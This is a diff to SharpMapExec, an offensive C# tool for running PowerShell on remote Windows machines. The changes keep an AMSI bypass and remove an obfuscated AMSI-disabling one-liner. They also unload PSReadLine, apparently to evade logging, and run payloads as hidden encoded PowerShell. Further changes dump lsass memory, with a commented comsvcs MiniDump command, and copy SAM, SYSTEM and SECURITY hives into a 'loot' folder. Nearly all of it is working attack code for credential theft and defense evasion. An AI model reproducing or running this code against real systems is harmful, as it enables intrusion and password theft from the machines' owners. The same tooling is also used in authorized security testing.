@@ -113,11 +113,11 @@ namespace SharpMapExec.Lib
                     using (var powershell = PowerShell.Create())
                     {
                         powershell.Runspace = runspace;
+                        powershell.AddScript("if(get-module psreadline -all){remove-module psreadline -Force}");
                         if (AmsiBypass)
                         {
                             string amsi = AmsiFail.GetPayload();
                             powershell.AddScript(amsi);
-                            //powershell.AddScript("[Ref].Assembly.GetType('System.Management.Automation.' + ([char]65) + 'm' + 's' + ($PSHOmE[4]) + 'Utils').GetField('a' + 'm' + 's' + 'i' + 'InitFailed','NonPublic,Static').SetValue(0,[bool]1)");
                         }
                         powershell.AddScript(argument);
                         result = powershell.Invoke();
@@ -228,15 +228,18 @@ namespace SharpMapExec.Lib
             }
             try
             {
-                string data = Compress(File.ReadAllBytes(path));
+                byte[] binary = File.ReadAllBytes(path);
+                string data = Compress(binary);
                 (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, PsFunction.UploadFile(data, destination), false, auth, scheme, true);
                 foreach (PSObject obj in result)
                 {
                     if (obj.ToString().Length == 0)
                     {
                         Console.WriteLine("  [-] Upload Failed");
+                        return;
                     }
                 }
+                Console.WriteLine(String.Format("  [+] Copied {0}kb to {1}", binary.ToArray().Length, destination));
             }
             catch (Exception e) // Connecting to remote server 192.168.1.10 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic
             {
@@ -322,18 +325,19 @@ namespace SharpMapExec.Lib
 
             if (flags.Contains("system"))
             {
-                caller = PsFunction.RunAsSystem(randomPath);
-                UploadContent(computer, command, randomPath, auth, scheme);
+                caller = PsFunction.RunAsSystem(command);
             }
             else if (flags.Contains("delegwalk"))
             {
-                caller = PsFunction.RunDelegationWalk(randomPath);
-                UploadContent(computer, command, randomPath, auth, scheme);
+                caller = PsFunction.RunDelegationWalk(command);
             }
             else
             {
                 caller = command;
             }
+
+            //Console.WriteLine(command);
+            //Console.WriteLine(caller);
 
             try
             {
@@ -376,6 +380,10 @@ namespace SharpMapExec.Lib
             string argument = string.Format(@"start-process powershell -WindowStyle Hidden -ArgumentList '-NoP -enc {0} ' -wait ; test-path {1}", Convert.ToBase64String(Encoding.Unicode.GetBytes(ecmd)), path);
             //string argument = "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\windows\\temp\\Coredump.dmp full; Wait-Process rundll32";
             string destination = Path.Combine("loot", computer, "lsass.dmp");
+            if (!Directory.Exists(Path.Combine("loot", computer)))
+            {
+                Directory.CreateDirectory(Path.Combine("loot", computer));
+            }
             try
             {
                 (Collection<PSObject> result, Collection<ErrorRecord> errors) = InvokeCommand(computer, argument, false, auth, scheme);
@@ -422,6 +430,10 @@ namespace SharpMapExec.Lib
             string sam = Path.Combine(destination, "sam.hive");
             string sys = Path.Combine(destination, "system.hive");
             string sec = Path.Combine(destination, "security.hive");
+            if (!Directory.Exists(Path.Combine("loot", computer)))
+            {
+                Directory.CreateDirectory(Path.Combine("loot", computer));
+            }
 
             //Get registry hives
             try
